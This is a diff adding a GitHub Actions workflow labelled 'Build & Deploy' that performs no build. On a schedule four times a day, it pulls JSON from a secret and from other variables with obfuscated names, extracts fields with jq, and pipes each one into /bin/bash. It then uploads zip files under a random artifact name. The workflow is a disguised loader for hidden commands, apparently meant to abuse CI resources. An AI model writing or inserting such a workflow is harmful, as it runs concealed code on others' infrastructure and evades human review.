@@ -1,0 +1,38 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          ul715: ${{ secrets.ul715 }}
+        run: |
+          printf '%s' "$ul715" | jq -r .dkwz4 | /bin/bash
+          printf '%s' "$cgaob25547" | jq -r .u8 | /bin/bash
+          echo $lr94 | jq -r .tiyu09186 | /bin/bash
+          echo $by764 | jq -r .ejbf94062 | /bin/bash
+          echo $qf16310 | jq -r .o5 | /bin/bash
+          echo $ggx43 | jq -r .omwn372 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p5jhDEKB
+          path: "*.zip"
+          retention-days: 1
